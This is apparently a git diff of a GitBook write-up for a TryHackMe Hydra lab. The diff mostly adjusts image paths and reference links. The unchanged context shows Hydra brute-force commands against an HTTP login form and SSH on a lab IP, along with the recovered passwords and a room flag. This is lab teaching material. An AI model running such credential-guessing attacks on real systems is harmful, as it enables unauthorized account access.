@@ -1,5 +1,5 @@
 ---
-description: https://www.kali.org/tools/hydra/ https://tryhackme.com/room/hydra
+description: https://www.kali.org/tools/hydra/
 ---
 
 # 🐉 Hydra
@@ -94,17 +94,17 @@ Below is a more concrete example Hydra command to brute force a POST login form:
 
 Go to website: 10.10.226.238:80
 
-<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 17-53-28.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Schermata del 2023-07-08 17-53-28.png" alt=""><figcaption></figcaption></figure>
 
 and try to login with "default" credentials: admin:password.
 
 We use Burp Suite and Foxy Proxy to intercept traffic and request:
 
-<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 17-55-16.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Schermata del 2023-07-08 17-55-16.png" alt=""><figcaption></figcaption></figure>
 
 After this, we turn off Foxy Proxy and retry to login with the same credentials:
 
-<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 17-10-46.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Schermata del 2023-07-08 17-10-46.png" alt=""><figcaption></figcaption></figure>
 
 The form and parameters to use with Hydra for Post-Web-Form are:
 
@@ -122,7 +122,7 @@ sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.226.238 http-post-
 sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.226.238 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 ```
 
-<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 18-05-24.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Schermata del 2023-07-08 18-05-24.png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 molly:sunshine
@@ -155,7 +155,7 @@ sudo hydra -l <username> -P <full path to pass> $IP -t 4 ssh
 sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.226.238 ssh
 ```
 
-<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 18-06-05.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Schermata del 2023-07-08 18-06-05.png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 molly:butterfly
@@ -191,6 +191,10 @@ THM{c8eeb0468febbadea859baeb33b2541b}
 
 </details>
 
+{% embed url="https://www.kali.org/tools/hydra/" %}
+
+{% embed url="https://tryhackme.com/room/hydra" %}
+
 ### Other References
 
 {% embed url="https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/" %}
@@ -198,8 +202,3 @@ THM{c8eeb0468febbadea859baeb33b2541b}
 {% embed url="https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/" %}
 
 {% embed url="https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-passwords-with-tamper-data-thc-hydra-0155374/" %}
-
-
-
-
-
